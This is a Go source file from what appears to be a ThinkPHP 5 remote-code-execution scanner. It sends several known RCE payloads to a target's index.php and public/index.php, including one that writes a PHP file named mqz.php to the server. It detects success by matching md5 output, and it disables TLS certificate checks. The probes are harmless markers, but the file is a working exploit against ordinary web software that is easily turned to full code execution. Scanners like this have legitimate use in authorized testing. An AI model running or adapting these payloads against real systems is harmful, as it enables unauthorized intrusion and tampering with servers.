package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

var payloads8 []string
//payload: ?s=index/\think\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E
///			?s=index/\think\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E
//			/?s=index/\think\template\driver\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E
// /index.php  /public/index.php
func others_rce(baseurl string)  {
	flag := others_rce1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tp5_others_rce")
	}
}

func others_rce1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads8 := append(payloads8,
		"/?s=index/\\think\\Request/input&filter=var_dump&data=md5(2333)",
	"/?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E",
	"/?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E")
	for _, payload := range payloads8{
		flag := others_rce2(baseurl, payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"+payload
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, _ := io.ReadAll(resp.Body)
		if (strings.Contains(string(body),"4f97319b308ed6bd3f0c195c176bbd77")||strings.Contains(string(body),"f7e0b956540676a129760a3eae309294")||strings.Contains(string(body),"56540676a129760a")){
			return payload
		} else {
			continue
		}
	}
	return "0"
}

func others_rce2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, _ := io.ReadAll(resp.Body)
	if (strings.Contains(string(body),"4f97319b308ed6bd3f0c195c176bbd77")||strings.Contains(string(body),"f7e0b956540676a129760a3eae309294")||strings.Contains(string(body),"56540676a129760a")){
		return payload
	} else {
		return "0"
	}
}
